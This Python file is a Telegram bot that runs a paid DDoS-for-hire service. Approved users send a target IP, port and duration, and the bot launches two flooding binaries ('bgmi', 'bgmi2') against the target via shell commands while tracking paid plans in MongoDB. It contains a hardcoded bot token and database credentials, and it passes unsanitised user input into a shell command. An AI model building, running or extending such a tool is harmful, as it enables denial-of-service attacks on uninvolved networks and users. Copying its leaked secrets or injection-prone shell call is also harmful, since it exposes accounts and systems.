import os
os.system('pip install telebot pymongo aiohttp')
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import random
from subprocess import Popen
from threading import Thread
import asyncio
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

loop = asyncio.get_event_loop()

TOKEN = '6753975076:AAFPss-I9K4f9OwRj7eduvkapA8gx9AjKBY'
MONGO_URI = 'mongodb+srv://botplays:botplays@botplays.0xflp.mongodb.net/?retryWrites=true&w=majority&appName=Botplays'
FORWARD_CHANNEL_ID = -1002165028046
CHANNEL_ID = -1002165028046
error_channel_id = -1002165028046

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['botplays']
users_collection = db.users

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

# List of blocked ports
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Track ongoing attacks
ongoing_attacks = {}

async def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    await start_asyncio_loop()

async def start_asyncio_loop():
    while True:
        now = datetime.now()
        for message_id, (chat_id, target_ip, target_port, duration, end_time, user_id) in list(ongoing_attacks.items()):
            remaining_time = int((end_time - now).total_seconds())
            if remaining_time > 0:
                try:
                    bot.edit_message_reply_markup(
                        chat_id=chat_id,
                        message_id=message_id,
                        reply_markup=create_time_left_button(remaining_time)
                    )
                except Exception as e:
                    logging.error(f"Error updating message: {e}")
            else:
                try:
                    bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=message_id,
                        text=f"*✅ Attack Finished! ✅\n\n📡 Host: {target_ip}\n👉 Port: {target_port}*",
                        parse_mode='Markdown',
                        reply_markup=create_inline_keyboard()
                    )
                    forward_attack_finished_message(chat_id, user_id, target_ip, target_port)
                except Exception as e:
                    logging.error(f"Error updating message: {e}")
                ongoing_attacks.pop(message_id, None)
        await asyncio.sleep(1)

async def run_attack_command_async(message_id, chat_id, target_ip, target_port, duration):
    # Start the first binary command
    process1 = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 100")
    
    # Start the second binary command
    process2 = await asyncio.create_subprocess_shell(f"./bgmi2 {target_ip} {target_port} {duration} 100")

    # Wait for both processes to finish
    await process1.communicate()
    await process2.communicate()

    # After both attacks finish, update the message
    bot.edit_message_text(
        chat_id=chat_id,
        message_id=message_id,
        text=f"*✅ Attack Finished! ✅*\n"
            f"*The attack on {target_ip}:{target_port} has finished successfully.*\n"
            f"*Thank you for using our service!*",
        parse_mode='Markdown',
        reply_markup=create_inline_keyboard()
    )

    # Remove the attack from ongoing attacks
    ongoing_attacks.pop(message_id, None)


def forward_attack_finished_message(chat_id, user_id, target_ip, target_port):
    message = (f"*Forwarded from* [User](tg://user?id={user_id})\n\n"
               f"*✅ Attack Finished! ✅*\n"
               f"*The attack on {target_ip}:{target_port} has finished successfully.*")

    bot.send_message(
        FORWARD_CHANNEL_ID,
        message,
        parse_mode='Markdown'
    )

def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
    except:
        return False

def create_inline_keyboard():
    keyboard = InlineKeyboardMarkup()
    button = InlineKeyboardButton(text="OWNER", url="https://t.me/botplays90")
    keyboard.add(button)
    return keyboard

def create_time_left_button(remaining_time):
    keyboard = InlineKeyboardMarkup()
    button = InlineKeyboardButton(text="Time remaining", callback_data=f"time_remaining_{remaining_time}")
    keyboard.add(button)
    return keyboard

@bot.message_handler(commands=['add', 'remove'])
def add_or_remove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = is_user_admin(user_id, CHANNEL_ID)
    cmd_parts = message.text.split()

    if not is_admin:
        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /add <user_id> <plan> <days> or /remove <user_id>.*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0

    if action == '/add':
        if plan == 1:  # Plan 1 (formerly Plan 2) 💥
            if users_collection.count_documents({"plan": 1}) >= 499:
                bot.send_message(chat_id, "*Approval failed: Plan 1 💥 limit reached (499 users).*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
                return

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days.*"
    else:  # remove
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} disapproved and reverted to free.*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown', reply_markup=create_inline_keyboard())
    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown', reply_markup=create_inline_keyboard())

@bot.message_handler(commands=['attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*You are not approved to use this bot. \nPlease contact @botplays90*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
            return

        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 499:
            bot.send_message(chat_id, "*Your Plan 1 💥 is currently not available due to limit reached.*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
            return

        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces. \nE.g. - 167.67.25 6296 60*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*Error in command\nPlease Press Again your Command*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
            return
        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. \nPlease use a different port.*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
            return

        end_time = datetime.now() + timedelta(seconds=duration)
        attack_message = bot.send_message(
            message.chat.id,
            f"*❌ Attack started ❌\n\n📡 Host : {target_ip}\n👉 Port : {target_port}*",
            parse_mode='Markdown',
            reply_markup=create_time_left_button(duration)
        )

        # Store the message_id and related details for later update
        ongoing_attacks[attack_message.message_id] = (message.chat.id, target_ip, target_port, duration, end_time, message.from_user.id)

        asyncio.run_coroutine_threadsafe(
            run_attack_command_async(attack_message.message_id, message.chat.id, target_ip, target_port, duration),
            loop
        )
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

@bot.message_handler(commands=['info'])
def info_command(message):
    user_id = message.from_user.id
    user_data = users_collection.find_one({"user_id": user_id})
    if user_data:
        username = message.from_user.username
        plan = user_data.get('plan', 'N/A')
        valid_until = user_data.get('valid_until', 'N/A')
        current_time = datetime.now().isoformat()
        response = (f"*👤 USERNAME: @{username}\n"
                    f"💸 Plan: {plan}\n"
                    f"⏳ Valid Until: {valid_until}\n"
                    f"⏰ Current Time: {current_time}*")
    else:
        response = "*No account information found. \nPlease contact @botplays90*"
    bot.send_message(message.chat.id, response, parse_mode='Markdown', reply_markup=create_inline_keyboard())

@bot.message_handler(commands=['help'])
def help_command(message):
    bot.send_message(message.chat.id, "*Use /attack then enter IP port duration.\n\nClick the menu button to check all commands.*", parse_mode='Markdown', reply_markup=create_inline_keyboard())

@bot.message_handler(commands=['owner'])
def owner_command(message):
    bot.send_message(message.chat.id, "*Owner - @botplays90*", parse_mode='Markdown', reply_markup=create_inline_keyboard())

@bot.message_handler(commands=['canary'])
def canary_command(message):
    bot.send_message(message.chat.id, "*DM - @botplays90*", parse_mode='Markdown', reply_markup=create_inline_keyboard())

@bot.message_handler(commands=['id'])
def id_command(message):
    user_id = message.from_user.id
    bot.send_message(message.chat.id, f"Your Telegram ID: `{user_id}`", parse_mode='Markdown')

@bot.message_handler(commands=['start'])
def start_message(message):
    # Send welcome message to the user
    bot.send_message(message.chat.id, "*WELCOME! \n\nTo launch an attack, use the /attack command followed by the target host and port.\n\nFor example: After /attack enter IP port duration.\n\nMake sure you have the target in sight before unleashing the chaos!\n\nIf you're new here, check out the /help command to see what else I can do for you.\n\nRemember, with great power comes great responsibility. Use it wisely... or not! 😈*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
    
    # Forward a message to the specified channel
    bot.send_message(
        CHANNEL_ID,
        f"User {message.from_user.username} (ID: {message.from_user.id}) has started the bot.",
        parse_mode='Markdown'
    )


@bot.callback_query_handler(func=lambda call: call.data.startswith('time_remaining_'))
def handle_time_remaining_callback(call):
    remaining_time = int(call.data.split('_')[-1])
    bot.answer_callback_query(call.id, f"Time remaining: {remaining_time} seconds")

if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("Starting Codespace activity keeper and Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        time.sleep(REQUEST_INTERVAL)
        